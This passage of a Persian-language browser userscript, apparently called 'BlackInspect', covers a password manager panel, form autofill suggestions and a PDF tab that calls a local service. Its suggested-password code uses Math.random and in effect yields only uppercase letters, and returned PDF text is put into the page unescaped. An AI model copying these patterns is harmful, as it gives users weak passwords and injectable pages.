      W.querySelectorAll('[data-copy]').forEach(b => b.addEventListener('click',()=>{ navigator.clipboard?.writeText(b.dataset.copy); const orig=b.textContent; b.textContent='✓'; b.classList.add('copied'); setTimeout(()=>{b.textContent=orig;b.classList.remove('copied');},1500); }));
      W.querySelectorAll('[data-toggle-pwd]').forEach(b => b.addEventListener('click',()=>{ const id=b.dataset.togglePwd; shown[id]=!shown[id]; render(); }));
      W.querySelectorAll('[data-cedit]').forEach(b => b.addEventListener('click',e=>{ e.stopPropagation(); editId=b.dataset.cedit; view='edit'; render(); }));
      W.querySelectorAll('[data-cdel]').forEach(b => b.addEventListener('click',e=>{ e.stopPropagation(); if(confirm('این رمز حذف شود؟')){ creds=creds.filter(c=>c.id!==b.dataset.cdel); saveCreds(); render(); } }));
      const eye=W.querySelector('#pf-eye'); if(eye) eye.addEventListener('click',()=>{ const p=W.querySelector('#pf-pass'); if(p){p.type=p.type==='password'?'text':'password';} });
      const lenR=W.querySelector('#gen-len'); if(lenR) lenR.addEventListener('input',()=>{ genOpts.len=+lenR.value; W.querySelector('#gen-len-val').textContent=genOpts.len; genPwd=genPassword(genOpts.len,genOpts); const out=W.querySelector('#gen-out'); if(out) out.textContent=genPwd; });
      ['upper','lower','digits','sym'].forEach(k=>{ const cb=W.querySelector(`#gen-${k}`); if(cb) cb.addEventListener('change',()=>{ genOpts[k]=cb.checked; genPwd=genPassword(genOpts.len,genOpts); const out=W.querySelector('#gen-out'); if(out) out.textContent=genPwd; }); });
      const psLen=W.querySelector('#ps-len'); if(psLen) psLen.addEventListener('input',()=>{ pref.len=+psLen.value; savePref(); const v=W.querySelector('#ps-len-val'); if(v) v.textContent=pref.len; });
      W.querySelectorAll('[data-del-email]').forEach(el => el.addEventListener('click',()=>{ pref.emails=pref.emails.filter(e=>e!==el.dataset.delEmail); savePref(); render(); }));
      W.querySelectorAll('[data-del-user]').forEach(el => el.addEventListener('click',()=>{ pref.users=pref.users.filter(u=>u!==el.dataset.delUser); savePref(); render(); }));
      W.querySelectorAll('[data-fill-user]').forEach(b => b.addEventListener('click',()=>{ const inp=W.querySelector('#pf-user'); if(inp) inp.value=b.dataset.fillUser; }));
    }
    render();
  }

  function biAutoFillDetect(pref) {
    const pwdFields = document.querySelectorAll('input[type=password]');
    const emailFields = document.querySelectorAll('input[type=email],input[name*=email],input[placeholder*=mail i]');
    const userFields  = document.querySelectorAll('input[name*=user i],input[name*=login i],input[placeholder*=user i]');
    emailFields.forEach(f=>{ if(f._biDone) return; f._biDone=true; const list=document.createElement('datalist'); list.id='bi-el-'+Math.random().toString(36).slice(2); pref.emails.forEach(e=>{ const opt=document.createElement('option'); opt.value=e; list.appendChild(opt); }); document.body.appendChild(list); f.setAttribute('list', list.id); });
    userFields.forEach(f=>{ if(f._biDone) return; f._biDone=true; const list=document.createElement('datalist'); list.id='bi-ul-'+Math.random().toString(36).slice(2); pref.users.forEach(u=>{ const opt=document.createElement('option'); opt.value=u; list.appendChild(opt); }); document.body.appendChild(list); f.setAttribute('list', list.id); });
    if(pwdFields.length){ const sugPwd=['ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz','0123456789','!@#$%^&*'].reduce((a,s)=>{ let p=a+''; while(p.length<pref.len) p+=s[Math.random()*s.length|0]; return p; },'').slice(0,pref.len); pwdFields.forEach(f=>{ if(f._biDone) return; f._biDone=true; f.placeholder=`پیشنهاد: ${sugPwd}`; f.addEventListener('focus',()=>{ if(!f.value) f.value=sugPwd; }); }); alert(`🔑 ${pwdFields.length} فیلد رمز پیدا شد. رمز پیشنهادی (${pref.len} کاراکتر) تنظیم شد.`); } else { alert('فیلد رمز در این صفحه پیدا نشد.'); }
  }

  // biRenderPdfTab - PDF tab (improved UI)
  function biRenderPdfTab(container) {
    if (!document.getElementById('bi-pdf-style')) {
      const s = document.createElement('style');
      s.id = 'bi-pdf-style';
      s.textContent = `
        .bi-pdf { display:flex; flex-direction:column; height:100%; direction:rtl; font-family:'Vazirmatn','Tahoma',sans-serif; }
        .bi-pdf-body { flex:1; overflow-y:auto; padding:10px; }
        .bi-pdf-drop { border:2px dashed #2e2e3a; border-radius:14px; padding:28px 16px; text-align:center; cursor:pointer; transition:all .2s; margin-bottom:10px; }
        .bi-pdf-drop:hover,.bi-pdf-drop.drag { border-color:#3b82f6; background:#0d1f3633; }
        .bi-pdf-drop-ico { font-size:38px; margin-bottom:8px; }
        .bi-pdf-drop-ttl { font-size:14px; color:#ccc; font-weight:600; margin-bottom:4px; }
        .bi-pdf-drop-sub { font-size:11px; color:#555; }
        .bi-pdf-url-row { display:flex; gap:7px; margin-bottom:10px; }
        .bi-pdf-url-inp { flex:1; background:#1c1c24; border:1px solid #2e2e3a; border-radius:10px; color:#eee; padding:9px 12px; font-size:12px; outline:none; direction:ltr; transition:.15s; }
        .bi-pdf-url-inp:focus { border-color:#3b82f6; }
        .bi-pdf-url-btn { padding:9px 16px; background:#3b82f6; color:#fff; border:none; border-radius:10px; font-size:13px; font-weight:700; cursor:pointer; transition:.15s; white-space:nowrap; }
        .bi-pdf-url-btn:hover { background:#2563eb; }
        .bi-pdf-grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-bottom:10px; }
        .bi-pdf-act { background:#18181f; border:1px solid #26262e; border-radius:12px; padding:13px; cursor:pointer; text-align:center; transition:all .2s; }
        .bi-pdf-act:hover { border-color:#3b82f644; background:#1e1e2a; transform:translateY(-1px); }
        .bi-pdf-act-ico { font-size:24px; margin-bottom:6px; }
        .bi-pdf-act-lbl { font-size:12px; color:#ddd; font-weight:600; }
        .bi-pdf-act-sub { font-size:10px; color:#555; margin-top:3px; }
        .bi-pdf-result { background:#161620; border:1px solid #2a2a35; border-radius:12px; padding:12px; }
        .bi-pdf-result-head { display:flex; align-items:center; gap:8px; margin-bottom:10px; }
        .bi-pdf-result-ico { font-size:22px; }
        .bi-pdf-result-name { font-size:13px; color:#eee; font-weight:600; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .bi-pdf-result-pages { font-size:11px; color:#666; }
        .bi-pdf-result-body { background:#111113; border-radius:8px; padding:10px; font-size:11px; color:#aaa; line-height:1.7; max-height:150px; overflow-y:auto; direction:ltr; text-align:left; }
        .bi-pdf-result-acts { display:flex; gap:7px; margin-top:10px; flex-wrap:wrap; }
        .bi-pdf-act-btn { padding:7px 14px; border-radius:8px; border:none; cursor:pointer; font-size:12px; font-weight:600; transition:.15s; }
        .bi-pdf-act-btn.prim { background:#3b82f6; color:#fff; }
        .bi-pdf-act-btn.sec  { background:#22222a; color:#aaa; border:1px solid #2e2e3a; }
        .bi-pdf-act-btn.sec:hover { color:#eee; }
        .bi-pdf-prog { display:flex; flex-direction:column; align-items:center; gap:10px; padding:20px; text-align:center; }
        .bi-pdf-prog-spinner { width:36px; height:36px; border:3px solid #2a2a35; border-top-color:#3b82f6; border-radius:50%; animation:bi-spin .7s linear infinite; }
        @keyframes bi-spin { to { transform:rotate(360deg); } }
        .bi-pdf-prog-txt { font-size:13px; color:#888; }
        .bi-pdf-recent-ttl { font-size:11px; color:#555; font-weight:600; margin-bottom:7px; display:flex; align-items:center; gap:6px; }
        .bi-pdf-recent-item { display:flex; align-items:center; gap:9px; padding:9px 11px; background:#18181f; border:1px solid #26262e; border-radius:10px; margin-bottom:6px; cursor:pointer; transition:.15s; }
        .bi-pdf-recent-item:hover { border-color:#3b82f633; }
        .bi-pdf-recent-name { flex:1; font-size:12px; color:#ccc; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
        .bi-pdf-recent-size { font-size:10px; color:#555; }
      `;
      document.head.appendChild(s);
    }

    let result  = null;
    let loading = false;
    let recent  = JSON.parse(GM_getValue('bi_pdf_recent','[]'));
    const KERNEL = GM_getValue('bi_python_kernel', 'http://127.0.0.1:5000');

    async function processPdf(url, action='extract') {
      loading=true; result=null; render();
      try {
        const r = await fetch(`${KERNEL}/pdf`, {
          method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({url, action})
        });
        if (!r.ok) throw new Error(`خطا: ${r.status}`);
        result = await r.json();
        const name = url.split('/').pop() || url;
        recent = [{name, url, pages:result.pages||'?', ts:Date.now()}, ...recent.filter(x=>x.url!==url)].slice(0,5);
        GM_setValue('bi_pdf_recent', JSON.stringify(recent));
      } catch(e) {
        result = { error: e.message || 'خطا در پردازش PDF' };
      }
      loading=false; render();
    }

    function render() {
      container.innerHTML = `<div class="bi-pdf">
        <div class="bi-pdf-body">
          <div class="bi-pdf-drop" id="bi-pdf-drop"><div class="bi-pdf-drop-ico">📄</div><div class="bi-pdf-drop-ttl">فایل PDF را اینجا رها کنید</div><div class="bi-pdf-drop-sub">یا از طریق آدرس URL وارد کنید</div></div>
          <div class="bi-pdf-url-row"><input class="bi-pdf-url-inp" id="bi-pdf-url" placeholder="https://example.com/file.pdf" dir="ltr"><button class="bi-pdf-url-btn" data-pact="load">📥 بارگذاری</button></div>
          ${loading ? `<div class="bi-pdf-result"><div class="bi-pdf-prog"><div class="bi-pdf-prog-spinner"></div><div class="bi-pdf-prog-txt">در حال پردازش PDF...</div></div></div>` : ''}
          ${result && !loading ? renderResult() : ''}
          ${!result && !loading ? `
            <div class="bi-pdf-grid">${[['📝','استخراج متن','بیرون کشیدن تمام متن','extract'],['📊','استخراج جدول','تبدیل جداول به CSV','tables'],['🔍','اسکن متادیتا','عنوان، نویسنده، صفحات','meta'],['🔒','بررسی رمز','تشخیص محافظت با رمز','security']].map(([i,l,s,a])=>`<div class="bi-pdf-act" data-pact="${a}"><div class="bi-pdf-act-ico">${i}</div><div class="bi-pdf-act-lbl">${l}</div><div class="bi-pdf-act-sub">${s}</div></div>`).join('')}</div>
            ${recent.length?`<div class="bi-pdf-recent-ttl">🕐 اخیر</div>${recent.map(r=>`<div class="bi-pdf-recent-item" data-pload="${r.url}"><span style="font-size:18px">📄</span><div class="bi-pdf-recent-name">${r.name}</div><div class="bi-pdf-recent-size">${r.pages} صفحه</div></div>`).join('')}`:''}
          ` : ''}
        </div>
      </div>`;
      bindPdfEvents();
    }

    function renderResult() {
      if (result.error) return `<div class="bi-pdf-result" style="border-color:#ff555533"><div style="display:flex;align-items:center;gap:8px;color:#ff5555;font-size:13px">⚠️ ${result.error}</div><button class="bi-pdf-act-btn sec" data-pact="clear" style="margin-top:10px">× بستن</button></div>`;
      return `<div class="bi-pdf-result"><div class="bi-pdf-result-head"><span class="bi-pdf-result-ico">📄</span><span class="bi-pdf-result-name">${result.filename||'PDF'}</span><span class="bi-pdf-result-pages">${result.pages||'?'} صفحه</span></div>${result.text?`<div class="bi-pdf-result-body">${result.text.slice(0,600)}${result.text.length>600?'...':''}</div>`:''}${result.meta?`<div style="font-size:11px;color:#888;margin-top:8px;line-height:1.8">${Object.entries(result.meta).map(([k,v])=>`<div><strong style="color:#aaa">${k}:</strong> ${v}</div>`).join('')}</div>`:''}<div class="bi-pdf-result-acts">${result.text?`<button class="bi-pdf-act-btn prim" data-copy-pdf="${result.text.replace(/"/g, '&quot;')}">📋 کپی متن</button>`:''}${result.text?`<button class="bi-pdf-act-btn sec" data-pdf-dl>💾 دانلود TXT</button>`:''}<button class="bi-pdf-act-btn sec" data-pact="clear">× بستن</button></div></div>`;
    }

    function bindPdfEvents() {
      const W = container.querySelector('.bi-pdf');
      if (!W) return;
      W.querySelectorAll('[data-pact]').forEach(el => el.addEventListener('click',()=>{
        const a=el.dataset.pact;
        if (a==='clear') { result=null; render(); return; }
        const url=(W.querySelector('#bi-pdf-url')?.value||'').trim();
        if (a==='load'||a==='extract'||a==='tables'||a==='meta'||a==='security') {
          if (!url) { alert('لطفاً آدرس URL وارد کنید'); return; }
          processPdf(url, a);
        }
      }));
      W.querySelectorAll('[data-pload]').forEach(el => el.addEventListener('click',()=>{ const inp=W.querySelector('#bi-pdf-url'); if(inp){inp.value=el.dataset.pload; processPdf(el.dataset.pload,'extract');} }));
      W.querySelectorAll('[data-copy-pdf]').forEach(b => b.addEventListener('click',()=>{ navigator.clipboard?.writeText(b.dataset.copyPdf); b.textContent='✓ کپی شد'; setTimeout(()=>{b.textContent='📋 کپی متن';},1500); }));
      const dlBtn=W.querySelector('[data-pdf-dl]'); if(dlBtn&&result?.text) dlBtn.addEventListener('click',()=>{ const a=document.createElement('a'); a.href=URL.createObjectURL(new Blob([result.text],{type:'text/plain;charset=utf-8'})); a.download=(result.filename||'pdf')+'.txt'; a.click(); });
      const dz=W.querySelector('#bi-pdf-drop'); if(dz){ dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('drag');}); dz.addEventListener('dragleave',()=>dz.classList.remove('drag')); dz.addEventListener('drop',e=>{ e.preventDefault(); dz.classList.remove('drag'); const file=e.dataTransfer.files[0]; if(file&&file.type==='application/pdf'){ const r=new FileReader(); r.onload=ev=>{ const b64=ev.target.result.split(',')[1]; loading=true; result=null; render(); fetch(`${KERNEL}/pdf/upload`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:b64,name:file.name,action:'extract'})}).then(r=>r.json()).then(d=>{result=d;loading=false;render();}).catch(e2=>{result={error:e2.message};loading=false;render();}); }; r.readAsDataURL(file); } }); }
    }
    render();
  }

  // launcher button
  const launcher = D.createElement("div");
  launcher.id = "bi-launcher";
  launcher.style.cssText = `position:fixed;bottom:20px;right:20px;z-index:2147483647;background:#1f6feb;color:#fff;width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:22px;box-shadow:0 4px 20px rgba(31,111,235,0.5);direction:ltr;transition:background .2s,transform .1s;user-select:none;`;
  launcher.textContent = "⚙";
  launcher.title = "BlackInspect v7.0";
  launcher.onmouseenter = () => (launcher.style.background = "#388bfd");
  launcher.onmouseleave = () => (launcher.style.background = "#1f6feb");
  launcher.onclick = () => { if (!panel) createPanel(); else panel.style.display = panel.style.display === "none" ? "flex" : "none"; };
  D.addEventListener("DOMContentLoaded", () => D.body?.appendChild(launcher));
  if (D.body) D.body.appendChild(launcher);
  else D.addEventListener("DOMContentLoaded", () => D.body.appendChild(launcher));
})();
